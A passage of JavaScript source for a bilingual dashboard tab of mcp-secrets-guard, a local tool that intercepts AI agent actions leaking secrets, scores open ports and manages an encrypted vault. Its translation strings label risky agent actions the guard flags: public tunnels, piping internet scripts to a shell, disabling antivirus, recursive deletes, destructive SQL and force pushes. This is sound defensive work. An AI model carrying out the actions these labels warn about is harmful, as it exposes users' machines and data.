/* mcp-secrets-guard — Hermes dashboard tab.
 * Plain IIFE, no build step. React + fetchJSON come from the host via
 * window.__HERMES_PLUGIN_SDK__. All text is rendered through React (auto-escaped);
 * no innerHTML anywhere. HTML reports open in a sandboxed iframe (no scripts). */
(function (SDK, onReady) {
  "use strict";
  if (!SDK || !SDK.React) return;
  const React = SDK.React;

  // ---- i18n & Language Management ----
  let currentLang = (function () {
    try {
      const saved = typeof localStorage !== "undefined" && localStorage ? localStorage.getItem("msg_lang") : null;
      if (saved === "ru" || saved === "en") return saved;
      const l = (typeof navigator !== "undefined" && ((navigator.languages && navigator.languages[0]) || navigator.language)) || "";
      return /^(ru|uk|be)\b/i.test(l) ? "ru" : "en";
    } catch (e) { return "en"; }
  })();

  const langListeners = new Set();
  function setLanguage(lang) {
    if (lang !== "ru" && lang !== "en") return;
    currentLang = lang;
    try { if (typeof localStorage !== "undefined" && localStorage) localStorage.setItem("msg_lang", lang); } catch (e) {}
    try { post("/config", { lang: lang }).catch(function () {}); } catch (e) {}
    langListeners.forEach(function (fn) { try { fn(lang); } catch (e) {} });
  }

  /* I18N_RU_BEGIN */
  const I18N_RU = {
    "Live protection": "Защита",
    "live protection": "защита в реальном времени",
    "Live protection (#)": "Защита (#)",
    "Protection": "Защита",
    "Ports": "Порты",
    "Code Inspector": "Проверка кода",
    "Vault": "Сейф",
    "Settings": "Настройки",
    "Exposure": "Порты",
    "network exposure": "открытые порты",
    "Exposure score ": "Оценка защищенности портов ",
    "Port security score ": "Оценка защищенности портов ",
    "Exposure score #/100": "Оценка защищенности портов #/100",
    "Port security score #/100": "Оценка защищенности портов #/100",
    "Exposure score 86/100": "Оценка защищенности портов 86/100",
    "safe listeners": "безопасные",
    " critical · ": " критичных · ",
    " high · ": " высоких · ",
    " medium · ": " средних · ",
    " low": " низких",
    "# actions blocked": "Заблокировано действий: #",
    "# action blocked": "Заблокировано действие",
    "  An agent tried to send sensitive data. Decide below what should happen.": "  Агент пытался отправить важные данные. Решите ниже, что делать.",
    "  Every agent action is checked for secrets before it runs.": "  Каждое действие агента проверяется на секреты до запуска.",
    "Protected": "Защищено",
    "Last check ": "Последняя проверка: ",
    "Last check 0s ago": "Проверено только что",
    "0s ago": "только что",
    "just now": "только что",
    "s ago": " с назад",
    " min ago": " мин назад",
    " h ago": " ч назад",
    " d ago": " дн назад",
    " attempts": " попыток",
    "Agent ": "Агент ",
    "session ": "сеанс ",
    "an agent": "агент",
    "vault · your secrets, encrypted": "сейф · ваши секреты, зашифрованы",
    "Add a file": "Добавить файл",
    "Up to 10 MB: .env, keys, wallet files, documents.": "До 10 МБ: .env, ключи, файлы кошельков, документы.",
    "Protected: #": "Под защитой: #",
    "Protected: ": "Под защитой: ",
    "Trash (": "Корзина (",
    "Trash (#)": "Корзина (#)",
    "Restore": "Восстановить",
    "Restored.": "Восстановлено.",
    "Delete forever": "Удалить навсегда",
    "Delete forever? This cannot be undone.": "Удалить навсегда? Это нельзя отменить.",
    "Deleted forever.": "Удалено навсегда.",
    "file": "файл",
    "text": "текст",
    "New name": "Новое название",
    "New value": "Новое значение",
    "Save": "Сохранить",
    "Cancel": "Отмена",
    "Rename": "Переименовать",
    "Renamed.": "Переименовано.",
    "Change kind": "Сменить категорию",
    "Kind changed.": "Категория изменена.",
    "Replace value": "Заменить значение",
    "Value replaced. Agents keep the same token.": "Значение заменено. Токен для агентов прежний.",
    "Save a copy to Downloads": "Сохранить копию в «Загрузки»",
    "Saved a copy to Downloads.": "Копия сохранена в «Загрузки».",
    "Move to trash": "В корзину",
    "Move to trash? You can restore it later.": "В корзину? Его можно восстановить позже.",
    "Moved to the trash.": "Перемещено в корзину.",
    "quarantined from an agent": "перехвачено у агента",
    "added by you": "добавлено вами",
    "Undo": "Отменить",
    "undone": "отменено",
    "Everything runs on this computer. Secret values are never shown or sent.": "Всё работает на этом компьютере. Секреты никогда не показываются и не отправляются.",
    "No incidents yet.": "Инцидентов пока нет.",
    "No incidents yet": "Инцидентов пока нет",
    "Hold to show the full value": "Удерживайте, чтобы увидеть значение целиком",
    "Could not show the value.": "Не удалось показать значение.",
    "Unknown finding.": "Неизвестная находка.",
    "This value was not stored in the vault, so it cannot be shown.": "Это значение не сохранено в сейфе, поэтому его нельзя показать.",
    "The value is no longer in the vault.": "Этого значения больше нет в сейфе.",
    "🔒 Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "🔒 Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
    "Everything runs on this computer. Secrets are masked; the full value appears only while you hold 👁, and every view is logged.": "Всё работает на этом компьютере. Секреты замаскированы: полное значение видно, только пока вы удерживаете 👁, и каждый просмотр записывается в журнал.",
    "Safer: ": "Безопаснее: ",
    "Safer: Use --host 127.0.0.1": "Безопаснее: Используйте --host 127.0.0.1",
    "Use --host 127.0.0.1 (or bind to localhost) unless other devices really need it.": "Используйте --host 127.0.0.1 (или привязку к localhost), если другим устройствам действительно не нужен доступ.",
    "Keep OLLAMA_HOST=127.0.0.1.": "Сохраняйте OLLAMA_HOST=127.0.0.1.",
    "Use -p 127.0.0.1:PORT:PORT.": "Используйте -p 127.0.0.1:ПОРТ:ПОРТ.",
    "Add --bind 127.0.0.1, and never run it in a folder with secrets.": "Добавьте --bind 127.0.0.1 и никогда не запускайте сервер в папке с секретами.",
    "Only open a tunnel you started yourself, with a password, and close it after use.": "Открывайте только туннели, созданные вами лично, защищайте паролем и закрывайте после использования.",
    "Ask the user first; open only the exact port for the exact program.": "Сначала спросите пользователя; открывайте только точный порт для конкретной программы.",
    "Use a VPN instead of exposing Remote Desktop.": "Используйте VPN вместо открытия Remote Desktop в сеть.",
    "Delete only an exact path the user named, and prefer moving to a trash folder.": "Удаляйте только указанный пользователем точный путь и отдавайте предпочтение перемещению в корзину.",
    "Take a backup first and confirm the exact table with the user.": "Сначала сделайте резервную копию и уточните у пользователя точное имя таблицы.",
    "Use --force-with-lease, or ask the user first.": "Используйте --force-with-lease или сначала спросите пользователя.",
    "Download the script first, read it, then run it.": "Сначала скачайте скрипт, изучите его содержимое и только потом запускайте.",
    "Do not let an agent change antivirus settings.": "Не позволяйте агенту изменять настройки антивируса.",
    "If you turn it off: Other computers will no longer be able to access files and printers shared from this PC.": "Если отключить: Другие компьютеры больше не смогут получать доступ к общим файлам и принтерам на этом ПК.",
    "If you turn it off: ASUS software will stop communicating with the router or motherboard utility.": "Если отключить: Программы ASUS перестанут связываться с утилитой материнской платы или роутера.",
    "If you turn it off: ": "Если отключить: ",
    "Starts a server open to the whole network": "Запускает сервер, открытый для всей сети",
    "Exposes Ollama to the network": "Открывает доступ к Ollama из локальной сети",
    "Publishes a container port on all interfaces": "Публикует порт контейнера на всех сетевых интерфейсах",
    "Shares a folder over HTTP": "Открывает общий доступ к папке по HTTP",
    "Opens a public internet tunnel": "Создаёт публичный интернет-туннель",
    "Opens a port in the firewall or turns the firewall off": "Открывает порт в брандмауэре или отключает его",
    "Enables Remote Desktop": "Включает удалённый рабочий стол (RDP)",
    "Deletes files recursively": "Рекурсивно удаляет файлы и папки",
    "Destroys database data": "Уничтожает данные в базе данных",
    "Overwrites git history on the server": "Перезаписывает историю git на сервере (force push)",
    "Runs a script straight from the internet": "Запускает скрипт напрямую из интернета (pipe to shell)",
    "Turns off antivirus protection": "Отключает антивирусную защиту Windows Defender",
    "The service will accept connections from any device on the network, and from the internet if the router forwards the port.": "Сервис будет принимать подключения с любого устройства в сети, а при пробросе портов — из интернета.",
    "Anyone on the network could run, pull or delete your local AI models.": "Любой пользователь в сети сможет запускать, скачивать или удалять ваши локальные ИИ-модели.",
    "docker -p without an address publishes the port to every network and bypasses Windows Firewall in many setups.": "docker -p без указания адреса публикует порт на всех интерфейсах и часто обходит брандмауэр Windows.",
    "python -m http.server serves the whole folder to the network by default.": "python -m http.server по умолчанию открывает доступ ко всей текущей папке для всех устройств в сети.",
    "Tunnels (ngrok, cloudflared, localtunnel, bore) publish a local service on the internet, bypassing the router and firewall.": "Туннели (ngrok, cloudflared, localtunnel) делают локальный сервис доступным из интернета в обход роутера и брандмауэра.",
    "Changes what the internet can reach on this computer.": "Изменяет правила доступа из интернета к службам на этом компьютере.",
    "Remote Desktop is the most attacked service on the internet.": "Удалённый рабочий стол — самый часто атакуемый сервис в сети.",
    "This permanently deletes a folder tree. Agents have wiped projects and home folders this way.": "Это безвозвратно удаляет дерево каталогов. Агенты неоднократно стирали проекты таким способом.",
    "DROP / TRUNCATE / DELETE without WHERE removes data permanently.": "DROP / TRUNCATE / DELETE без условия WHERE безвозвратно уничтожают таблицы.",
    "A force push can erase other people's work and published history.": "Force push может стереть чужие коммиты и перезаписать историю репозитория.",
    "Downloading and executing code in one step runs whatever the server sends, with your permissions.": "Скачивание и запуск кода в одну строчку выполняет любой присланный сервером код с вашими правами.",
    "Disabling Defender removes protection against malware.": "Отключение Defender лишает систему защиты от вредоносных программ.",
    "Safer:": "Безопаснее:",
    "(via curl)": "(через curl)",
    "Protect & send": "Защитить и отправить",
    "Block & quarantine": "Заблокировать и изолировать",
    "Allow once": "Разрешить один раз",
    "⛔ Block": "⛔ Заблокировать",
    "🛡 Protect & send": "🛡 Защитить и отправить",
    "GitHub access token": "Токен доступа GitHub",
    "terminal": "терминал",
    "shell: curl": "команда: curl",
    "shell: ollama": "команда: ollama",
    "incident history": "история инцидентов",
    "Check code": "Проверить код",
    "Checking…": "Проверка…",
    "Load example": "Пример скрипта",
    "Open full report": "Полный отчёт",
    "Close report": "Закрыть отчёт",
    "Full report": "Полный отчёт",
    "Credentials": "Учётные данные",
    "Financial": "Финансовые данные",
    "PII": "Персональные данные",
    "Health": "Медицинские данные",
    "Location": "Данные о геолокации",
    "Password, API key or token": "Пароль, API-ключ или токен",
    "Card or bank account": "Банковская карта или счёт",
    "Personal data (name, phone, email)": "Персональные данные (ФИО, телефон, email)",
    "Medical data": "Медицинские данные",
    "Location data": "Геолокация и координаты",
    "Protect this secret": "Защитить этот секрет",
    "Encrypting…": "Шифрование…",
    "Secret name (e.g. OpenAI Key, Visa Card)": "Название секрета (например: Ключ OpenAI, Карта Visa)",
    "Paste the secret value": "Значение секрета (пароль, токен, ключ)",
    "Check again": "Проверить снова",
    "Scanning…": "Сканирование…",
    "port": "порт",
    "(pid": "(pid",
    "What to do:": "Рекомендация:",
    "Nothing risky is open to the network.": "Опасных портов в сети не обнаружено.",
    "Open to every network": "Открыт для всей сети",
    "Open to this local network": "Открыт для локальной сети",
    "Only this computer": "Только для этого компьютера",
    "Critical": "Критический",
    "High": "Высокий",
    "Medium": "Средний",
    "Low": "Низкий",
    "Safe": "Безопасный",
    "mcp-secrets-guard blocked an agent": "mcp-secrets-guard заблокировал агента",
    "mcp-secrets-guard": "mcp-secrets-guard"
  };
  /* I18N_RU_END */

  const I18N_EN = {
    "Защита": "Protection",
    "Порты": "Ports",
    "Проверка кода": "Code Inspector",
    "Сейф": "Vault",
    "Настройки": "Settings",
    "Ожидает решения": "Pending",
    "Заблокировано": "Blocked, secret quarantined",
    "Разрешено": "Allowed once",
    "Защищено": "Protected & sent",
    "Инцидентов пока нет.": "No incidents yet.",
    "Все": "All",
    "Удалить навсегда": "Delete forever",
    "В корзину": "Move to trash",
    "Восстановить": "Restore",
    "Переименовать": "Rename",
    "Сменить категорию": "Change kind",
    "Заменить значение": "Replace value",
    "Сохранить копию в «Загрузки»": "Save a copy to Downloads",
    "Безопаснее: ": "Safer: ",
    "Защитить и отправить": "Protect & send",
    "Заблокировать и изолировать": "Block & quarantine",
    "Разрешить один раз": "Allow once",
    "⛔ Заблокировать": "⛔ Block",
    "🛡 Защитить и отправить": "🛡 Protect & send",
    "Проверить код": "Check code",
    "Пример скрипта": "Load example",
    "Полный отчёт": "Open full report",
    "Закрыть отчёт": "Close report",
    "Защитить этот секрет": "Protect this secret",
    "Шифрование…": "Encrypting…",
    "Проверить снова": "Check again",
    "Сканирование…": "Scanning…",
    "Очистить историю": "Clear history"
  };

  function lookup(s) {
    if (Object.prototype.hasOwnProperty.call(I18N_RU, s)) return I18N_RU[s];
    const nums = s.match(/\d+/g);
    if (nums) {
      const k = s.replace(/\d+/g, "#");
      if (Object.prototype.hasOwnProperty.call(I18N_RU, k)) {
        let i = 0;
        return I18N_RU[k].replace(/#/g, function () { return nums[i++]; });
      }
    }
    return null;
  }

  function T(s) {
    if (typeof s !== "string" || !s) return s;
    if (currentLang === "ru") {
      const whole = lookup(s);
      if (whole !== null) return whole;
      const m = s.match(/^([^A-Za-z(]*)([\s\S]*?)([\s.:·…]*)$/);
      if (m && m[2]) {
        const core = lookup(m[2]);
        if (core !== null) return m[1] + core + m[3];
      }
      if (s.indexOf("(via ") !== -1) return s.replace(/\(via\s+([^)]+)\)/g, "(через $1)");
      if (s.indexOf("Safer: ") !== -1) return s.replace(/Safer:\s*/g, "Безопаснее: ");
      if (s.indexOf("Exposure score ") !== -1) return s.replace(/Exposure score\s*/g, "Оценка защищенности портов ");
      return s;
    } else {
      if (Object.prototype.hasOwnProperty.call(I18N_EN, s)) return I18N_EN[s];
      if (s.indexOf("Безопаснее: ") !== -1) return s.replace(/Безопаснее:\s*/g, "Safer: ");
      if (s.indexOf("(через ") !== -1) return s.replace(/\(через\s+([^)]+)\)/g, "(via $1)");
      return s;
    }
  }

  const h = function (type, props) {
    const kids = Array.prototype.slice.call(arguments, 2).map(function (c) {
      return typeof c === "string" ? T(c) : c;
    });
    if (props && (props.placeholder || props.title) && typeof type === "string") {
      props = Object.assign({}, props,
        props.placeholder ? { placeholder: T(props.placeholder) } : null,
        props.title && type !== "iframe" ? { title: T(props.title) } : null);
    }
    return React.createElement.apply(null, [type, props].concat(kids));
  };

  const { useState, useEffect, useCallback, useRef } = React;
  const API = "/api/plugins/yadro-guard";
  const POLL_MS = 4000;
  const TOAST_MS = 20000;

  function post(path, body) {
    return SDK.fetchJSON(API + path, {
      method: "POST",
      headers: { "Content-Type": "application/json", "X-Mcp-Secrets-Guard": "1" },
      body: JSON.stringify(body),
    });
  }

  function ago(ts) {
    if (!ts) return "";
    const s = Math.max(0, Math.floor(Date.now() / 1000 - ts));
    if (s < 60) return currentLang === "ru" ? "только что" : "just now";
    if (s < 3600) return Math.floor(s / 60) + (currentLang === "ru" ? " мин назад" : " min ago");
    if (s < 86400) return Math.floor(s / 3600) + (currentLang === "ru" ? " ч назад" : " h ago");
    return Math.floor(s / 86400) + (currentLang === "ru" ? " дн назад" : " d ago");
  }

  function fmtTs(ts) {
    if (!ts) return "";
    const d = new Date(ts * 1000), p = function (n) { return (n < 10 ? "0" : "") + n; };
    return p(d.getDate()) + "." + p(d.getMonth() + 1) + "." + d.getFullYear() +
      " " + p(d.getHours()) + ":" + p(d.getMinutes()) + ":" + p(d.getSeconds());
  }

  function copyText(text, okLabel) {
    if (!text) return;
    const show = function () {
      var el = document.createElement("div");
      el.textContent = okLabel || (currentLang === "ru" ? "Скопировано в буфер" : "Copied to clipboard");
      el.style.cssText = "position:fixed; bottom:60px; right:16px; z-index:9999; background:#111a28; color:#00f0ff; padding:8px 14px; border-radius:6px; font:12px monospace; border:1px solid #00f0ff; box-shadow:0 0 15px rgba(0,240,255,0.4);";
      document.body.appendChild(el);
      setTimeout(function () { el.remove(); }, 1800);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(show).catch(function () {});
      return;
    }
    var ta = document.createElement("textarea"); ta.value = text; document.body.appendChild(ta);
    ta.select(); try { document.execCommand("copy"); show(); } catch (e) {} ta.remove();
  }

  function blobDownload(name, text, type) {
    var blob = new Blob([text], { type: type || "text/plain;charset=utf-8" });
    var url = URL.createObjectURL(blob);
    var a = document.createElement("a"); a.href = url; a.download = name; document.body.appendChild(a);
    a.click(); URL.revokeObjectURL(url); a.remove();
  }

  function sha256(text) {
    var enc = new TextEncoder().encode(text);
    if (window.crypto && window.crypto.subtle) {
      return window.crypto.subtle.digest("SHA-256", enc).then(function (buf) {
        return [].map.call(new Uint8Array(buf), function (b) { return (b < 16 ? "0" : "") + b.toString(16); }).join("");
      });
    }
    var h1 = 0x811c9dc5, h2 = 0x9e3779b9;
    for (var i = 0; i < text.length; i++) { var c = text.charCodeAt(i); h1 = ((h1 ^ c) * 16777619) >>> 0; h2 = Math.imul(h2 ^ c, 16777619) >>> 0; }
    return Promise.resolve("x" + h1.toString(16) + h2.toString(16));
  }

  function proofFooter(hash, when) {
    if (currentLang === "ru") {
      return "\n\n———————————————— PROOF SEAL ————————————————\nSHA-256 отчёта: " + hash + "\nВремя генерации: " + when + "\nЦелостность: подтверждена (локально, без облака).\n";
    }
    return "\n\n———————————————— PROOF SEAL ————————————————\nReport SHA-256: " + hash + "\nGenerated at: " + when + "\nIntegrity: Verified locally (zero cloud).\n";
  }

  function getStatusText(status) {
    if (currentLang === "ru") {
      var ru = { pending: "Ожидает решения", quarantined: "Заблокировано", blocked: "Заблокировано", allowed: "Разрешено", protected: "Защищено" };
      return ru[status] || status;
    }
    var en = { pending: "Pending decision", quarantined: "Blocked, secret quarantined", blocked: "Blocked", allowed: "Allowed once", protected: "Protected & sent" };
    return en[status] || status;
  }

  function miniReport(inc, kind) {
    const ts = Math.floor(Date.now() / 1000);
    const when = fmtTs(ts);
    const body = (kind === "json")
      ? JSON.stringify({ incident: inc, generated: ts }, null, 2)
      : [
          currentLang === "ru" ? "mcp-secrets-guard — протокол инцидента" : "mcp-secrets-guard — Incident Report",
          "ID: " + inc.id,
          (currentLang === "ru" ? "Статус: " : "Status: ") + getStatusText(inc.status),
          (currentLang === "ru" ? "Время (локальное): " : "Local Time: ") + fmtTs(inc.at),
          (currentLang === "ru" ? "Агент: " : "Agent: ") + (inc.agent && (inc.agent.chat_title || inc.agent.session_id) ? (inc.agent.chat_title || inc.agent.session_id) : ""),
          (currentLang === "ru" ? "Инструмент: " : "Tool: ") + (inc.tool || ""),
          (currentLang === "ru" ? "Назначение: " : "Destination: ") + (inc.destination || ""),
        ].join("\n") + (inc.command ? "\nCommand:\n" + inc.command : (inc.risks && inc.risks[0] ? "\nSnippet:\n" + (inc.risks[0].snippet || "") : ""));
    sha256(body).then(function (hash) {
      var out = body + proofFooter(hash, when);
      blobDownload("incident-" + inc.id + "." + (kind === "json" ? "json" : "txt"), out, kind === "json" ? "application/json" : "text/plain;charset=utf-8");
    });
  }

  function escHtml(s) {
    return String(s == null ? "" : s).replace(/[&<>]/g, function (c) {
      return c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;";
    });
  }

  // ---- DYNAMIC HERMES SESSION RESOLVER (ZERO HARDCODING) ----
  var _sessionTitlesCache = {};
  var _titleListeners = new Set();
  var _titlesFetched = false;

  function loadDynamicSessionTitles() {
    try {
      if (!SDK || !SDK.fetchJSON) return;
      SDK.fetchJSON("/sessions/titles")
        .then(function (r) {
          if (r && r.status === "ok" && r.titles) {
            Object.keys(r.titles).forEach(function (k) {
              var t = String(r.titles[k] || "").trim();
              if (t) {
                _sessionTitlesCache[k] = t;
                var shortK = String(k).slice(-6);
                _sessionTitlesCache[shortK] = t;
              }
            });
            _titlesFetched = true;
            _titleListeners.forEach(function (fn) { try { fn(_sessionTitlesCache); } catch (e) {} });
          }
        })
        .catch(function () {});
    } catch (e) {}
  }

  function parseHermesSidebarTitles() {
    var found = {};
    function scan(doc) {
      if (!doc) return;
      try {
        var sel = [
          "a[href*='/chat/']",
          "a[href*='/session/']",
          "a[href*='chat']",
          "[data-session-id]",
          "[data-chat-id]",
          "[data-id]",
          ".session-item",
          ".chat-item",
          ".sidebar-item",
          "nav a",
          "[role='navigation'] a",
          "[data-testid*='session']",
          "[data-testid*='chat']"
        ].join(", ");
        var els = doc.querySelectorAll(sel);
        for (var i = 0; i < els.length; i++) {
          var el = els[i];
          var href = el.getAttribute("href") || "";
          var sid = el.getAttribute("data-session-id") || el.getAttribute("data-chat-id") || el.getAttribute("data-id") || (el.dataset && (el.dataset.sessionId || el.dataset.chatId || el.dataset.id)) || "";
          if (!sid && href) {
            var m = href.match(/(?:chat|session)[s]?\/([a-zA-Z0-9_\-]+)/);
            if (m) sid = m[1];
          }
          var raw = el.innerText || el.textContent || el.getAttribute("title") || el.getAttribute("aria-label") || "";
          var text = raw.replace(/\s+/g, " ").trim();
          text = text.replace(/^(?:chat|чат)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim();
          if (sid && text) {
            found[sid] = text;
            found[String(sid).slice(-6)] = text;
          }
        }
      } catch (e) {}
    }
    scan(document);
    try { if (window.parent && window.parent !== window && window.parent.document) scan(window.parent.document); } catch (e) {}
    try { if (window.top && window.top !== window && window.top.document) scan(window.top.document); } catch (e) {}
    return found;
  }

  function resolveChatTitle(sessionId) {
    if (!sessionId) {
      return {
        title: currentLang === "ru" ? "«Архивный сеанс»" : "\"Archived session\"",
        raw: currentLang === "ru" ? "Архивный сеанс" : "Archived session",
        id: "—"
      };
    }
    var sidStr = String(sessionId);
    var shortId = sidStr.slice(-6);

    // 1. Check in-memory SQLite / API cache
    var title = _sessionTitlesCache[sidStr] || _sessionTitlesCache[shortId];

    // 2. If not yet cached, attempt live DOM parsing of Hermes sidebar
    if (!title) {
      var domTitles = parseHermesSidebarTitles();
      Object.assign(_sessionTitlesCache, domTitles);
      title = _sessionTitlesCache[sidStr] || _sessionTitlesCache[shortId];
    }

    // 3. If still not cached, trigger async background fetch from /sessions/titles
    if (!title && !_titlesFetched) {
      loadDynamicSessionTitles();
    }

    var cleanTitle = title ? String(title).replace(/^(?:чат|chat)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim() : "";
    var fallback = currentLang === "ru" ? ("Сеанс #" + shortId) : ("Session #" + shortId);
    var outRaw = cleanTitle || fallback;
    var outTitle = currentLang === "ru" ? ("«" + outRaw + "»") : ("\"" + outRaw + "\"");

    return { title: outTitle, raw: outRaw, id: sidStr };
  }

  // Multi-line SVG text wrapper to prevent clipping or ellipsis
  function renderWrappedText(text, x, y, maxLineLen, maxLines, fontSize, fill, fontWeight) {
    if (!text) return null;
    var raw = String(text);
    var lines = [];
    if (raw.indexOf("/") !== -1 && raw.length > maxLineLen) {
      var parts = raw.split("/");
      if (parts.length >= 3 && parts[0].indexOf("http") !== -1) {
        lines = [parts[0] + "//" + parts[2], "/" + parts.slice(3).join("/")];
      }
    }
    if (lines.length === 0) {
      var words = raw.split(" ");
      var cur = "";
      for (var i = 0; i < words.length; i++) {
        var w = words[i];
        if (!cur) {
          cur = w;
        } else if ((cur + " " + w).length <= maxLineLen) {
          cur += " " + w;
        } else {
          lines.push(cur);
          cur = w;
          if (lines.length >= maxLines - 1) break;
        }
      }
      if (cur && lines.length < maxLines) lines.push(cur);
      if (lines.length === 0 && raw) {
        for (var j = 0; j < raw.length && lines.length < maxLines; j += maxLineLen) {
          lines.push(raw.slice(j, j + maxLineLen));
        }
      }
    }
    var lineH = fontSize * 1.35;
    return h("text", {
      x: x, y: y, textAnchor: "middle", fill: fill,
      fontSize: fontSize, fontWeight: fontWeight || 400
    }, lines.map(function (ln, idx) {
      return h("tspan", { x: x, dy: idx === 0 ? 0 : lineH, key: idx }, ln);
    }));
  }

  function passportText(inc, exp, vlt) {
    var L = [];
    var items = (inc && inc.items) || [];
    var pend = items.filter(function (i) { return i.status === "pending"; });
    var quar = items.filter(function (i) { return i.status === "quarantined" || i.status === "blocked"; });
    var allo = items.filter(function (i) { return i.status === "allowed" || i.status === "protected"; });
    if (currentLang === "ru") {
      L.push("mcp-secrets-guard — ПАСПОРТ БЕЗОПАСНОСТИ ПК");
      L.push("Сформирован: " + fmtTs(Math.floor(Date.now() / 1000)));
      L.push("============================================================");
      L.push("");
      L.push("1. ЗАЩИТА — перехват секретов до запуска");
      L.push("   Ожидают решения:        " + pend.length);
      L.push("   Всего инцидентов:       " + items.length);
      L.push("   Заблокировано/карантин: " + quar.length);
      L.push("   Разрешено/с защитой:    " + allo.length);
      L.push("");
      L.push("2. ОТКРЫТЫЕ ПОРТЫ — сетевая безопасность");
      if (exp && exp.status === "ok") {
        var c = exp.counts || {};
        L.push("   Оценка защищенности портов: " + (exp.score != null ? exp.score : "?") + "/100");
        L.push("   Критических: " + (c.critical || 0) + " · Высоких: " + (c.high || 0) + " · Средних: " + (c.medium || 0) + " · Низких: " + (c.low || 0));
      }
      L.push("");
      L.push("3. СЕЙФ — защищённые секреты");
      var vItems = (vlt && vlt.items) || [];
      var liveV = vItems.filter(function (v) { return !v.deleted; });
      L.push("   Секретов в хранилище: " + liveV.length);
    } else {
      L.push("mcp-secrets-guard — PC SECURITY PASSPORT");
      L.push("Generated: " + fmtTs(Math.floor(Date.now() / 1000)));
      L.push("============================================================");
      L.push("");
      L.push("1. PROTECTION — Intercepting secrets before execution");
      L.push("   Pending decision:       " + pend.length);
      L.push("   Total incidents:        " + items.length);
      L.push("   Blocked/quarantined:    " + quar.length);
      L.push("   Allowed/protected:      " + allo.length);
      L.push("");
      L.push("2. PORTS & EXPOSURE — Network listener security");
      if (exp && exp.status === "ok") {
        var c = exp.counts || {};
        L.push("   Port security score:    " + (exp.score != null ? exp.score : "?") + "/100");
        L.push("   Critical: " + (c.critical || 0) + " · High: " + (c.high || 0) + " · Medium: " + (c.medium || 0) + " · Low: " + (c.low || 0));
      }
      L.push("");
      L.push("3. VAULT — Protected credentials");
      var vItems = (vlt && vlt.items) || [];
      var liveV = vItems.filter(function (v) { return !v.deleted; });
      L.push("   Secrets in vault:       " + liveV.length);
    }
    return L.join("\n");
  }

  function buildPassport(format, done) {
    Promise.all([
      SDK.fetchJSON(API + "/incidents").catch(function () { return { status: "error", items: [] }; }),
      SDK.fetchJSON(API + "/exposure").catch(function () { return { status: "error" }; }),
      SDK.fetchJSON(API + "/vault").catch(function () { return { status: "error", items: [] }; }),
    ]).then(function (res) {
      var inc = res[0], exp = res[1], vlt = res[2];
      var raw = passportText(inc, exp, vlt);
      var when = fmtTs(Math.floor(Date.now() / 1000));
      sha256(raw).then(function (hash) {
        var doc = raw + proofFooter(hash, when);
        if (format === "txt") {
          blobDownload("security-passport-" + Math.floor(Date.now() / 1000) + ".txt", doc, "text/plain;charset=utf-8");
          if (done) done();
        } else {
          var w = window.open("", "_blank");
          if (!w) { if (done) done(); return; }
          w.document.write("<!DOCTYPE html><html><head><meta charset='utf-8'><title>mcp-secrets-guard Passport</title><style>body{font-family:monospace;background:#0d1117;color:#e6edf3;padding:24px;white-space:pre-wrap;}</style></head><body>" + escHtml(doc) + "</body></html>");
          w.document.close();
          if (done) done();
        }
      });
    }).catch(function () { if (done) done(); });
  }

  const LABEL_COLOR = {
    Credentials: "#3ec46d",
    Financial: "#f0b44a",
    PII: "#5b9dff",
    Health: "#e25555",
    Location: "#b45bc4",
  };

  function Card(p) {
    return h("div", { className: "yg-card " + (p.className || "") },
      p.title ? h("span", { className: "yg-hd" }, p.title) : null,
      p.children);
  }

  function Chip(p) {
    const l = p.label || {};
    return h("span", { className: "yg-chip", style: { background: l.color || LABEL_COLOR[l.id] || "#555" } },
      (l.icon ? l.icon + " " : "") + (l.label || l.id || ""));
  }

  function Pill(p) {
    return h("span", { className: "yg-pill " + p.kind }, p.children);
  }

  function Empty(p) { return h("div", { className: "yg-dim" }, "● " + p.text); }

  // =========================================================================
  // TASK 1: PAC-AGENT CYBER ARENA (Interactive 60 FPS SVG Visual Security Map)
  // =========================================================================
  function VisualSecurityMap(p) {
    var data = p.data || {}, items = (data.items || []), vaultCount = p.vaultCount || 0;
    var blocked = items.some(function (i) { return i.status === "blocked" || i.status === "quarantined"; });
    var intercepted = items.some(function (i) { return i.status === "protected"; });

    var rawChat = "";
    var dest = currentLang === "ru" ? "Шлюз защищён" : "Gateway protected";
    items.forEach(function (i) {
      if (!rawChat && i.agent) {
        if (i.agent.chat_title || i.agent.session_title) {
          rawChat = i.agent.chat_title || i.agent.session_title;
        } else if (i.agent.session_id) {
          var c = resolveChatTitle(i.agent.session_id);
          rawChat = c.raw || c.title;
        }
      }
      if (i.destination) dest = i.destination;
    });
    rawChat = String(rawChat || "").replace(/^(?:чат|chat)\s*[:«"']?\s*/i, "").replace(/[»"']$/i, "").trim();
    var chatName = rawChat
      ? (currentLang === "ru" ? "«" + rawChat + "»" : "\"" + rawChat + "\"")
      : (currentLang === "ru" ? "Ожидание команд" : "Awaiting agent commands");

    // Arena animation mode: "patrol" (idle 60 FPS), "vault" (mask & send demo), "block" (strike & destroy demo)
    var st0 = useState("patrol"), mode = st0[0], setMode = st0[1];
    var st1 = useState(0), animStep = st1[0], setAnimStep = st1[1];
    var st2 = useState(0), vaultBonus = st2[0], setVaultBonus = st2[1];
    var timerRef = useRef(null);

    function stopAnim() {
      if (timerRef.current) clearInterval(timerRef.current);
      setMode("patrol"); setAnimStep(0);
    }

    function startVaultDemo() {
      stopAnim();
      setMode("vault"); setAnimStep(0);
      var step = 0;
      timerRef.current = setInterval(function () {
        step += 2.5;
        if (step >= 100) {
          clearInterval(timerRef.current);
          setVaultBonus(function (v) { return v + 1; });
          setTimeout(stopAnim, 2400);
        }
        setAnimStep(Math.min(step, 100));
      }, 40);
    }

    function startBlockDemo() {
      stopAnim();
      setMode("block"); setAnimStep(0);
      var step = 0;
      timerRef.current = setInterval(function () {
        step += 3;
        if (step >= 100) {
          clearInterval(timerRef.current);
          setTimeout(stopAnim, 2400);
        }
        setAnimStep(Math.min(step, 100));
      }, 40);
    }

    function doRefresh() {
      stopAnim();
      if (p.refresh) p.refresh();
    }

    useEffect(function () { return function () { if (timerRef.current) clearInterval(timerRef.current); }; }, []);

